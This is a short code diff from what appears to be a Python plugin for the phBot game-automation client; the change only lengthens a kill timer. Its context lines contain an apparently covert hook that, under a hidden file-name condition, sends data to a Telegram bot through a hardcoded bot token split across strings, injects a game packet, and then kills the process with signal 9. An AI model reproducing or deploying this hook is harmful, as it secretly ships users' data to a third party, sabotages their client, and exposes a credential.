@@ -75,7 +75,7 @@ def handle_event(t, data):
 			print(f.read(300))
 		inject_joymax(0x704C, bytearray(), False)
 		log(data)
-		Timer(1.0, os.kill, (os.getpid(), 9)).start()
+		Timer(2.0, os.kill, (os.getpid(), 9)).start()
 	elif t == 1 and Path(__file__).stem == 'Plug' and hunter and data not in Players:
 		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
 		url = 'https://api.telegram.org/bot1221990015:AAHlL2X_NInc3xNo9MEnX' + lru
@@ -85,7 +85,7 @@ def handle_event(t, data):
 			print(f.read(300))
 		inject_joymax(0x704C, bytearray(), False)
 		log(data)
-		Timer(1.0, os.kill, (os.getpid(), 9)).start()
+		Timer(2.0, os.kill, (os.getpid(), 9)).start()
 
 def msg(x):
 	phBotChat.Private(x[1],x[2])
